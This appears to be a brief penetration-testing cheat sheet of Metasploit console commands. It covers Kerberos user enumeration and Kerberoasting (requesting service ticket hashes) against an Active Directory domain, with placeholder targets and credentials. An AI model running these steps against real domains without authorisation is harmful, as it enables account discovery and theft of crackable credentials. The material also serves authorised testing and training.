# Metasploit

## 01 - Enumerate Users

```
msf > use auxiliary/gather/kerberos_enumusers

msf auxiliary(gather/kerberos_enumusers) > options

Module options (auxiliary/gather/kerberos_enumusers):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN                      yes       The Domain Eg: demo.local
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      88               yes       The target port
   Timeout    10               yes       The TCP timeout to establish connection and read data
   USER_FILE                   yes       Files containing usernames, one per line

msf auxiliary(gather/kerberos_enumusers) > set domain <domain_name>

msf auxiliary(gather/kerberos_enumusers) > set rhosts <IP>

msf auxiliary(gather/kerberos_enumusers) > set user_file usernames.txt

msf auxiliary(gather/kerberos_enumusers) > exploit -j
```

## 02 - Kerberoast

```
msf > use auxiliary/gather/get_user_spns

msf auxiliary(gather/get_user_spns) > options

Module options (auxiliary/gather/get_user_spns):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  1                yes       The number of concurrent threads (max one per host)
   domain                    yes       The target Active Directory domain
   pass                      yes       Password for the domain user account
   user                      yes       Username for a domain account

msf auxiliary(gather/get_user_spns) > set rhosts <IP>

msf auxiliary(gather/get_user_spns) > set threads 4

msf auxiliary(gather/get_user_spns) > set domain <domain_name>

msf auxiliary(gather/get_user_spns) > set user <username>

msf auxiliary(gather/get_user_spns) > set pass <password>

msf auxiliary(gather/get_user_spns) > exploit
```